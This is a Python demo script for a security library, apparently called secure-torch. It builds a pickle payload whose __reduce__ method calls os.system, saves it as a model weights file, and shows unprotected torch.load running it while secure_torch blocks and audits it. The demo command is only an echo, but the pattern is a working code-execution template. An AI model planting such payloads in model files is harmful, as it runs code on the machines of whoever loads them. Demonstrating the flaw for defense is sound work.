import os
import torch
import secure_torch

print("\n" + "═" * 70)
print("🛡️  SECURE-TORCH: REAL-WORLD THREAT DEMONSTRATION  🛡️")
print("═" * 70 + "\n")

# 1. Provide Context
print("🎯 GOAL: Show how standard PyTorch loading is vulnerable to RCE ")
print("          (Remote Code Execution) and how secure-torch blocks it.\n")

# 2. Crafting the Malicious Payload
class MaliciousPayload:
    def __reduce__(self):
        # This payload will print a scary message and simulate a system breach
        command = 'echo "🛑 BOOM! 🛑 You just ran malicious code hidden in a model!"'
        # Windows compatibility
        if os.name == 'nt':
            command = 'echo 🛑 BOOM! 🛑 You just ran malicious code hidden in a model!'
        return (os.system, (command,))

payload_file = "malicious_weights.bin"
print(f"[*] 😈 Crafting a malicious model payload: '{payload_file}'...")
torch.save({"weights": MaliciousPayload()}, payload_file)
print("    ✅ Payload successfully injected and saved.\n")


# 3. Scenario 1: Unprotected Load
print("❌ SCENARIO 1: Unprotected `torch.load()`")
print("-" * 50)
print("[*] ⏳ Data scientist downloads and loads the model...\n")

try:
    # Danger!
    # The moment torch.load is called, the __reduce__ method from our malicious payload runs!
    torch.load(payload_file, weights_only=False)
except Exception as e:
    pass

print("\n    🚨 UH OH! The attacker's code just executed on our system!")
print("    The execution happened BEFORE we even opened the weights!\n")


# 4. Scenario 2: Protected Load with secure-torch
print("🛡️  SCENARIO 2: Protected `secure_torch.load()`")
print("-" * 50)
print("[*] ⏳ SecOps engineer loads the same file with `secure-torch`...\n")

try:
    # safe!
    secure_torch.load(payload_file)
    print("    ❌ FAILURE - Model loaded successfully (this shouldn't happen!)")
except Exception as e:
    print(f"    ✅ SUCCESS: Exploit blocked instantly!")
    print(f"    🔒 Exception Raised: {e.__class__.__name__}: {e}\n")


# 5. Scenario 3: Deep Threat Auditing
print("🔍 SCENARIO 3: Threat Intelligence Audit")
print("-" * 50)
print("[*] 🔎 Inspecting the file contents without executing it...\n")

try:
    _, report = secure_torch.load(payload_file, audit_only=True)
    print(f"    📊 Threat Level:      {report.threat_level.name}")
    print(f"    🧮 Score Breakdown:   {report.score_breakdown}")
    
    print("\n    ⚠️  Warnings Generated:")
    for warn in report.warnings:
         print(f"       - {warn}")
except Exception as e:
    print(f"    ✅ Audit completed... {e}")

print("\n" + "═" * 70)
print("🎉 Secure your AI pipeline today! `pip install secure-torch`")
print("═" * 70 + "\n")

# Cleanup
if os.path.exists(payload_file):
    os.remove(payload_file)
